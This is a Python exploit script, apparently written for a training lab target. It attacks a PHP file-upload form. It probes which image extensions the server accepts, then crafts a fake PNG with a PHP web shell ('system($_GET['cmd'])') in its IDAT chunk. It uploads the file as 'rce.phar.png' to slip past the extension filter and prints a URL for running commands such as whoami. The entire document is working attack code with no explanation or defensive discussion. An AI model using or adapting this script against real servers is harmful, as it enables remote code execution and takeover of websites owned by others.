import requests
import mimetypes
from io import BytesIO

def generate_malicious_png(php_payload):
    # PNG header
    png_header = b'\x89PNG\r\n\x1a\n'

    # Fake IHDR chunk (minimal valid)
    ihdr_chunk = b'\x00\x00\x00\x0D' + b'IHDR' + b'\x00'*13 + b'\x00\x00\x00\x00'

    # Embed PHP payload in IDAT chunk
    idat_data = b'<?php ' + php_payload.encode() + b' ?>'
    idat_chunk = (
        len(idat_data).to_bytes(4, 'big') +
        b'IDAT' + idat_data + b'\x00\x00\x00\x00'
    )

    # IEND chunk
    iend_chunk = b'\x00\x00\x00\x00IEND\xaeB`\x82'

    return png_header + ihdr_chunk + idat_chunk + iend_chunk

def enumerate_extensions_and_types(url):
    print("[*] Enumerating extensions and content-types...")

    allowed = []
    test_exts = ['png', 'jpg', 'gif', 'svg']
    for ext in test_exts:
        filename = f'test.{ext}'
        files = {'uploadFile': (filename, b'test', f'image/{ext}')}
        r = requests.post(url, files=files)
        if "Only images are allowed" not in r.text and "Extension not allowed" not in r.text:
            allowed.append(ext)

    print(f"[+] Allowed extensions: {allowed}")
    return allowed

def upload_file(url, filename, file_data, content_type):
    files = {
        'uploadFile': (filename, file_data, content_type)
    }
    r = requests.post(url, files=files)
    if r.status_code == 200:
        print("[+] Upload response:")
        print(r.text)
    else:
        print("[-] Upload failed.")
    return r

def main():
    target_url = 'http://94.237.60.55:57390/contact/upload.php'  # CHANGE ME
    upload_path = '/contact/user_feedback_submissions/'  # Based on PHP code
    php_payload = 'system($_GET["cmd"]);'

    allowed_exts = enumerate_extensions_and_types(target_url)
    if not allowed_exts:
        print("[-] No allowed extensions found.")
        return

    print("[*] Generating malicious .phar.png...")
    malicious_png = generate_malicious_png(php_payload)
    filename = 'rce.phar.png'
    content_type = 'image/png'

    print("[*] Uploading payload...")
    r = upload_file(target_url, filename, BytesIO(malicious_png), content_type)

    uploaded_url = f"{target_url.rsplit('/', 1)[0]}{upload_path}{filename}"
    print(f"[+] If successful, access the file at: {uploaded_url}?cmd=whoami")

if __name__ == "__main__":
    main()
